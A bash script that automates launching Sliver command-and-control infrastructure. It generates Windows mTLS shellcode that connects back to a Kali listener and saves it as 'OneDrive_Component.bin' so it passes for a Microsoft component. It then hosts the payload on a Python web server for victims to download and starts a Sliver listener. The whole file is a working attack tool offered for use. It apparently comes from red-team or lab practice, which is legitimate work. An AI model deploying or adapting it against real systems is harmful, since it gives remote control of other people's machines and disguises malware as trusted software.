#!/bin/bash

# --- SETUP
LHOST="192.168.122.235"             # enter your Kali's IP here
LPORT= "8443"                       # enter reverse shell listening port here
WEB_PORT="8080"                     # python Web Server port
PAYLOAD_NAME="OneDrive_Component.bin"

# get script's absolute directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
WWW_DIR="$DIR/www"

# create www dir if not exist
mkdir -p "$WWW_DIR"

echo -e "\e[1;34m[*]=========================================\e[0m"
echo -e "\e[1;34m[*] Launching Automated C2 Infrastructure   \e[0m"
echo -e "\e[1;34m[*]=========================================\e[0m"

# 1. GENERATE PAYLOAD
echo -e "\e[1;33m[*] 1. Generating mTLS shellcode with Sliver...\e[0m"

sliver-server generate -mtls "$LHOST:$LPORT" --os windows --arch amd64 --format shellcode --save "$WWW_DIR"

LATEST_PAYLOAD=$(ls -t "$WWW_DIR"/*.bin 2>/dev/null | head -n 1)

if [ -n "$LATEST_PAYLOAD" ]; then
    mv "$LATEST_PAYLOAD" "$WWW_DIR/$PAYLOAD_NAME"
    echo -e "\e[1;32m[+] Payload saved to: $WWW_DIR/$PAYLOAD_NAME\e[0m"
else
    echo -e "\e[1;31m[-] Error: Sliver payload generation failed.\e[0m"
    exit 1
fi

# 2. START PYTHON WEB SERVER
echo -e "\e[1;33m[*] 2. Starting Python Web Server on port $WEB_PORT...\e[0m"
cd "$WWW_DIR"
python3 -m http.server $WEB_PORT &
PYTHON_PID=$!  # save server PID
echo -e "\e[1;32m[+] Web Server listening on http://$LHOST:$WEB_PORT\e[0m"

# 3. START SLIVER LISTENER
echo -e "\e[1;33m[*] 3. Starting Sliver mTLS Listener on port 8443...\e[0m"
echo -e "\e[1;31m[!] Executing Sliver C2 Server. Write 'exit' or press Ctrl+C to close.\e[0m"
cd "$DIR"

sliver-server jobs -mtls -p 8443

sliver-server

# CLEANUP
echo -e "\n\e[1;34m[*] Shutting down the infrastructure...\e[0m"
echo -e "\e[1;33m[*] Terminating Python Web Server (PID: $PYTHON_PID)...\e[0m"
kill $PYTHON_PID 2>/dev/null
echo -e "\e[1;32m[+] Operation completed. Goodbye!\e[0m"